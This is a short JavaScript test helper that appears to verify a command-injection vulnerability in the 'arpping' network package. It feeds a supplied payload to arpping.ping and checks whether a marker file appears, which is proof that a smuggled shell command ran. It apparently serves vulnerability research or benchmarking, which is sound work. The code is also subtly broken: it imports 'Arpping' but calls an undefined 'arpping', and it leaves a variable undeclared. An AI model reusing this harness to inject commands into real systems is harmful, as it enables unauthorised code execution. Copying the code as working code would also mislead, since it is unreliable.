const Arpping = require("arpping");

function exploitFunction(payload) {
  const fs = require("fs");
  const path = "./arpping";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  return new Promise((resolve, reject) => {
    arpping.ping([payload])
      .then(() => {
        file_exist = fs.existsSync(path);
        expect(file_exist).toBe(true);
        resolve();
      })
      .catch((err) => {
        console.log(err);
        reject(err);
      })
      .finally(() => {
        fs.unlink(path, function (err) {});
      });
  });
}

module.exports = { exploitFunction };